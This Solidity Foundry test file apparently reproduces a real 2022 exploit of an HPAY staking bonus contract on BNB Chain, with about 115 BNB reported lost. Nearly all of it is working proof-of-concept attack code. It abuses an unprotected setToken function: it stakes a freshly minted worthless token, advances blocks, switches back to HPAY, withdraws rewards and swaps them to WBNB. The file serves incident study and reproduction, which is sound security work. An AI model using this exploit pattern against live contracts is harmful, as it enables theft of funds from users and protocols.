//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~115 BNB
// Attacker : 0xaB74FBd735Cd2ED826b64e0F850a890930A91094
// Attack Contracts :
//  - https://www.bscscan.com/address/0xe3eA6e35A6F88DB9d342352B056139803A94b586
//  - https://www.bscscan.com/address/0x10FC0476a67c84D8b8ddb143a0fE9eE207b71d2C
// Vulnerable Contract : https://www.bscscan.com/address/0xe9bc03ef08e991a99f1bd095a8590499931dcc30

// Attack Txs : https://bscscan.com/txs?a=0xab74fbd735cd2ed826b64e0f850a890930a91094

// @Info
// Vulnerable Contract Code : https://www.bscscan.com/address/0xe9bc03ef08e991a99f1bd095a8590499931dcc30#code#F1#L174
// This PoC is a simplification of the actual attack which was performed using multiple transactions.
// They can be seen here: https://bscscan.com/txs?a=0xab74fbd735cd2ed826b64e0f850a890930a91094
// The attacker transferred out 105.98 BNB + 10 BNB from the hack.

// @Analysis
// ACai Article (in Chinese) : https://www.cnblogs.com/ACaiGarden/p/16872933.html

interface IMintableAutoCompundRelockBonus {
    function setToken(address) external;
    function stake(uint256) external;
    function withdraw(uint256) external;
}

contract ContractTest is Test {
    IERC20 constant HPAY_TOKEN = IERC20(0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMintableAutoCompundRelockBonus constant BONUS =
        IMintableAutoCompundRelockBonus(0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0);

    function setUp() public {
        vm.createSelectFork("bsc", 22_280_853);
        // Adding labels to improve stack traces' readability
        vm.label(address(HPAY_TOKEN), "HPAY_TOKEN");
        vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(BONUS), "BONUS");
        vm.label(0xE9bc03Ef08E991a99F1bd095a8590499931DcC30, "BONUS_IMPL");
        vm.label(0xa0A1E7571F938CC33daD497849F14A0c98B30FD0, "WBNB_HPAY_PAIR");
        vm.label(0xc16e351751e63A34F44908b065Fc8Be592D564dE, "HPAY_RewardManager");
        vm.label(0xf88daA7723f118EfB4416a0DfD129e005CA9166F, "HPAY_RewardManager_Impl");
        vm.label(0x45b10a3C39DE271D8edc23796970acF8832C20ff, "HPAY_Fund");
        vm.label(0x346abB57CfB43aD3Bb8210E3DD1dB12353160A0b, "HPAY_FeeManager");
    }

    function testExploit() external {
        emit log_named_decimal_uint(
            "[Start] Attacker WBNB balance before exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );

        HPAY_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        // Shitcoin token creation
        SHITCOIN shitcoin = new SHITCOIN();
        shitcoin.mint(100_000_000 * 1e18);

        // Configuring shitcoin and staking it
        BONUS.setToken(address(shitcoin));
        shitcoin.approve(address(BONUS), type(uint256).max);
        BONUS.stake(shitcoin.balanceOf(address(this)));

        // Change block.number
        vm.roll(block.number + 1000);

        // Configure HPAY token back again
        BONUS.setToken(address(HPAY_TOKEN));

        // Withdraw reward token
        BONUS.withdraw(30_000_000 * 1e18);
        _HPAYToWBNB();

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );
    }

    /**
     * Auxiliary function to swap all HPAY to WBNB
     */
    function _HPAYToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(HPAY_TOKEN);
        path[1] = address(WBNB_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HPAY_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}

contract SHITCOIN {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "SHIT COIN";
    string public symbol = "SHIT";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
